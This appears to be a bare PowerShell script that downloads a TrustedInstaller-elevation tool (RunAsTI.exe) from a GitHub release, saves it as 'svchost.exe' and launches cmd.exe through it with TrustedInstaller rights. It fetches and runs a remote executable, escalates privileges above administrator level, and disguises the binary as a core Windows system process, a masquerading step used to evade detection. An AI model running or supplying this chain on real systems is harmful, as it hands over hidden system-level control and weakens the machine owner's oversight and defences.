cd C:
Invoke-WebRequest -Uri "https://github.com/mbcdev/RunAsTrustedInstaller/releases/download/release-0.2/RunAsTI.exe" -OutFile "svchost.exe"
Start-Process -FilePath "svchost.exe" -ArgumentList "cmd.exe /k whoami"
